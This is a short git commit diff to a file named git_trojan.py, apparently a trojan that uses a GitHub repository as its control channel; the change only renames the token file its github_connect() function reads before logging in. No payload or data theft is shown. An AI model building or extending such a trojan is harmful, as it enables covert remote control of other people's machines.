0362512556e39bdf91e4aa7e5a33225a919dffda
Jerry-MC137 <jeremychamberlin5@gmail.com>
2023-04-20 13:12:49 +0300

    minor modifications and bug fixes to the code.

--- git_trojan.py
+++ git_trojan.py
@@ -10,7 +10,7 @@ import time
 from datetime import datetime
 
 def github_connect():
-    with open('mytoken.txt') as f:
+    with open('github_authentication_token.txt') as f:
         token = f.read()
         user = 'tiarno'
         sess = github3.login(token=token)
